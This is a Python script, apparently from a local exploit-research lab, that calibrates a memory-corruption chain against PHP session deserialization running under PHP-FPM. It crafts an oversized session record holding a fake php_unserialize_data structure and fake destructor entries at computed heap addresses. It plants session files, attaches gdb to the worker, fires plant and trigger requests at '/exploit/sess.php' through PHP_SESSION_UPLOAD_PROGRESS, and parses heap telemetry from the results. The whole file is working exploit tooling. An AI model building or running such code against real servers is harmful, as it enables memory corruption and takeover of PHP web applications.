#!/usr/bin/env python3
"""Calibrate the single-name zif chain: fake struct in the first key, value i:1, safe dtor slot."""
import json, os, re, struct, subprocess, sys, time
LAB = "/tmp/opencode/research/drupal_fpm_20261022T013000Z"
sys.path.insert(0, LAB)
import tool
from tool import field, filepart

WORKER = int(sys.argv[1])
P = int(sys.argv[2], 0) if len(sys.argv)>2 else 0x7f5e6aa82000
X = int(sys.argv[3], 0) if len(sys.argv)>3 else 0x7f5e6aa70000
TOTAL = 81920
NAME_LEN = TOTAL - len(b'|i:1;')
D_OFF = 0x88
K_SAFE = (P + 0x1008 - (P + D_OFF + 0x10)) // 16
OUT = LAB + "/arms/zif_cal_%d.json" % WORKER

def build():
    name = bytearray(b'A' * NAME_LEN)
    name[0:0x300] = b'\x00' * 0x300
    p_off = P - (X + 24)
    d_off = p_off + D_OFF
    # struct php_unserialize_data at P
    name[p_off+0x00:p_off+0x08] = struct.pack('<Q', P + 56)
    name[p_off+0x08:p_off+0x10] = struct.pack('<Q', P + D_OFF)
    name[p_off+0x10:p_off+0x18] = struct.pack('<Q', P + D_OFF)
    name[p_off+0x18:p_off+0x20] = struct.pack('<Q', 0)
    name[p_off+0x20:p_off+0x28] = struct.pack('<Q', 0)
    name[p_off+0x28:p_off+0x30] = struct.pack('<Q', 0)
    name[p_off+0x30:p_off+0x38] = struct.pack('<Q', 0x7fffffff)
    name[p_off+0x38:p_off+0x40] = struct.pack('<Q', 0)
    name[p_off+0x40:p_off+0x48] = struct.pack('<Q', 0)
    # fake var_dtor_entries at P+D_OFF
    name[d_off+0x00:d_off+0x08] = struct.pack('<q', K_SAFE)
    name[d_off+0x08:d_off+0x10] = struct.pack('<Q', 0)
    rec = bytes(name) + b'|i:1;'
    assert len(rec)==TOTAL, (len(rec),TOTAL)
    assert b'|' not in name, ('pipe in name', name.find(b'|'))
    return rec, {'p_off':p_off,'d_off':d_off,'K_safe':K_SAFE,'name_len':NAME_LEN,
                 'slot':P+0x1008,'poff_slot':(P+0x1008)-(X+24)}

def current_worker():
    for d in os.listdir('/proc'):
        if not d.isdigit(): continue
        try:
            ppid=int(open('/proc/%s/stat'%d).read().split()[3]); cmd=open('/proc/%s/cmdline'%d,'rb').read().replace(b'\0',b' ').decode('latin1')
        except: continue
        if ppid==144755 and 'pool lab' in cmd: return int(d)
    return None

def parse(lines):
    out={}
    for l in lines:
        m=re.match(r"\[[^]]+\] REQ(\d+) ", l)
        if not m: continue
        n=int(m.group(1)); d=out.setdefault(n,{})
        for key,pat in [
            ('heap', r"PHPRQ_START heap=(0x[0-9a-f]+)"),
            ('dec', r"SESSION_DECODE str=(0x[0-9a-f]+) len=(\d+)"),
            ('tmp', r"TMPVAR entry P=(0x[0-9a-f]+) last_dtor=(0x[0-9a-f]+) used_slots=(-?\d+) next=(0x[0-9a-f]+)"),
            ('ret', r"TMPVAR ret slot=(0x[0-9a-f]+) dtor=(0x[0-9a-f]+) off=(-?\d+) used_now=(-?\d+) pre_val=(0x[0-9a-f]+) pre_type=(0x[0-9a-f]+)"),
            ('write', r"PS_WRITE val=(0x[0-9a-f]+) len=(\d+) head=([0-9a-f]+)"),
            ('flush', r"SESSION_FLUSH status=(\d+)"),
            ('uvar', r"UVAR ret=(\d+) cur=(0x[0-9a-f]+) val=(0x[0-9a-f]+) ti=(0x[0-9a-f]+)"),
            ('bail', r"ZEND_BAILOUT bg=(0x[0-9a-f]+)/(\d+)"),
        ]:
            mm=re.search(pat,l)
            if mm:
                if key=='heap': d['heap']=int(mm.group(1),16)
                elif key=='dec': d.setdefault('decodes',[]).append((int(mm.group(1),16),int(mm.group(2))))
                elif key=='tmp': d.setdefault('tmps',[]).append({'P':int(mm.group(1),16),'last':int(mm.group(2),16),'used':int(mm.group(3)),'next':int(mm.group(4),16)})
                elif key=='ret': d.setdefault('rets',[]).append({'slot':int(mm.group(1),16),'dtor':int(mm.group(2),16),'off':int(mm.group(3)),'used_now':int(mm.group(4)),'pre_val':int(mm.group(5),16),'pre_type':int(mm.group(6),16)})
                elif key=='write': d['write']={'val':int(mm.group(1),16),'len':int(mm.group(2)),'head':mm.group(3)}
                elif key=='flush': d['flush']=int(mm.group(1))
                elif key=='uvar': d.setdefault('uvars',[]).append({'ret':int(mm.group(1)),'cur':int(mm.group(2),16),'val':int(mm.group(3),16),'ti':int(mm.group(4),16)})
                elif key=='bail': d.setdefault('bails',[]).append((int(mm.group(1),16),int(mm.group(2))))
    return out

w=current_worker()
if w != WORKER: print('WARN worker',w,'expected',WORKER)
rec,geo=build()
res={'worker0':w,'P':P,'X':X,'geo':geo}
res['plant_seed']=tool.seed(os.path.join(tool.SESS,'sess_pl1'),tool.PLANT_REC)
res['trigger_seed']=tool.seed(os.path.join(tool.SESS,'sess_tb1'),rec)
open(tool.GLOG,'w').close()
gout=open(LAB+'/logs/gdb_zif_cal.out','wb')
g=subprocess.Popen(['gdb','-q','--batch','-x',LAB+'/gdb/gb_measure.gdb','-p',str(w)],stdout=gout,stderr=subprocess.STDOUT,cwd=LAB,start_new_session=True)
armed=False
for _ in range(200):
    if os.path.exists(tool.GLOG) and 'armed' in open(tool.GLOG,errors='replace').read(): armed=True; break
    time.sleep(0.1)
res['armed']=armed
if not armed:
    print(open(LAB+'/logs/gdb_zif_cal.out',errors='replace').read()[-3000:]); raise SystemExit(2)
n0=tool.req_count()
r=tool.post('/exploit/sess.php',[field('form',b'x')],tag='zc_plant',timeout=60,cookie='pl1')
res['plant']={'status':r['status'],'head':r['body'][:180].decode('latin1')}
time.sleep(0.6)
res['worker_after_plant']=current_worker()
n1=tool.req_count()
r=tool.post('/exploit/sess.php',[field('PHP_SESSION_UPLOAD_PROGRESS',b'x'),filepart()],tag='zc_trigger',timeout=120,cookie='tb1')
res['trigger']={'status':r['status'],'head':r['body'][:240].decode('latin1')}
time.sleep(1.2)
res['worker_after_trigger']=current_worker()
try:
    rd=tool.post('/exploit/detach.php',[field('form',b'x')],tag='zc_detach',timeout=30)
    res['detach']={'status':rd['status'],'head':rd['body'][:80].decode('latin1')}
except Exception as e: res['detach']={'err':str(e)}
time.sleep(0.5)
lines=open(tool.GLOG,errors='replace').read().splitlines()
res['reqs']=parse(lines)
res['plant_req']=res['reqs'].get(n0+1)
res['trigger_req']=res['reqs'].get(n1+1)
try:
    raw=open(os.path.join(tool.SESS,'sess_tb1'),'rb').read()
    res['file']={'len':len(raw),'head':raw[:96].hex()}
except Exception as e: res['file']={'err':str(e)}
json.dump(res,open(OUT,'w'),indent=1,default=str)
print(json.dumps({k:res.get(k) for k in ('worker0','P','X','geo','plant','worker_after_plant','trigger','worker_after_trigger','plant_req','trigger_req','file','detach')},indent=1,default=str))
